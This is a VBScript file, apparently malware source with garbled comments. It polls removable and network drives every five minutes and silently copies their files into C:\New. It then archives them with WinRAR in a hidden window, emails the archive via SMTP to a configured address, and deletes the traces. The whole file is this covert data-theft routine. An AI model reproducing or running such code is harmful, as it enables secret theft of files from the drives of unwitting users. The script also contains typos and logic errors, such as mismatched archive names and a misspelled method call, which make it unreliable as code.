On Error Resume Next
Dim fso, d, dc, s, f, f1, fp, fc, strMfrom, strMto, strMfpass, sfile
Dim WshShell, oShell, strcmdpath
Set oShell = WScript.CreateObject ("WSCript.shell")
Set fso = CreateObject("Scripting.FileSystemObject")

Do While True 'Do While ����Loop���� ��һ����ѭ��ʵ�ֶ�drives�ļ��
    getnewDrive
    wscript.sleep 5 * 1000 * 60
Loop

Function getnewDrive ' �����û���µ�drive?
    Set dc = fso.Drives
    For Each d In dc
        wscript.echo d.dirvename
        If d.DriveType >2 And d.IsReady = True Then '���drivetype�����Ժ�׼����� fp=fso.CreateFolder("c:\New") '����һ���µ��ļ��� �Է����U�̵��ļ�������
            fppth = fp.Path
            
            copyfiletotemp(d)
        End If
    Next
End Function

Function copyfiletotemp(folderspec)
    
    Set f = fso.GetFolder(folderspec)
    Set fc = f.SubFolders
    Set fs = f.Files
    For Each f1 In fc '�õ������ļ���
        f1.Copy(fppth)
    Next
    For Each f1 In fs ' �õ������ļ�
        f1.Copy(fppth)
    Next
    
    
    oShell.run "cmd /K CD C:\\Program Files\\WinRAR\ &rar.exe a c:\ufiles.rar c:\new\ -- ", 0 'ѹ��һ��
    
    
    sfile = "c:\upfiles.rar"
    sendfiletome strMfrom, strMto, strMfpass, sfile
End Function


Function sendfiletome(strMfrom, strMto, strMfpass, sfile)
    Dim uname, File, lenth, len2, smtpser
    lenth = InStrRev(strMfrom, "@")
    uname = Left(strMfrom, lenth -1)
    len2 = Len(strMfrom) - lenth
    smtpser = "smtp."&Right(strMfrom, len2)
    NameSpace = "http://schemas.microsoft.com/cdo/configuration/"
    Set Email = CreateObject("CDO.Message")
    Email.From = strMfrom
    Email.To = strMto
    Email.Subject = "����������,���"
    Email.Textbody = "���,�Һ���.Ŷ �����ƿ��ˮ"
    If (sfile = nul) Then
        Email.AddAttachment sfile, True '˫��������Ӹ���,����ж������дһ��
    End If
    With Email.Configuration.Fields
        .Item(NameSpace&"sendusing") = 2
        .Item(NameSpace&"smtpserver") = smtpser '���ŷ�����
        .Item(NameSpace&"smtpserverport") = 25
        .Item(NameSpace&"smtpauthenticate") = 1
        .Item(NameSpace&"sendusername") = uname'�����˵�����
        .Item(NameSpace&"sendpassword") = strMfpass '������������
        .Update
    End With
    Email.Send
    oshell.reu "del c:\new\&del"&sfile '��ɨ�ۼ�
    Set oShell = Nothing '�ͷŶ���
End Function

'tips:
'drivetype:
' 0�� "Unknown"
' 1�� "Removable"
' 2�� "Fixed"
' 3�� "Network"
' 4�� "CD-ROM"
' 5�� "RAM Disk"
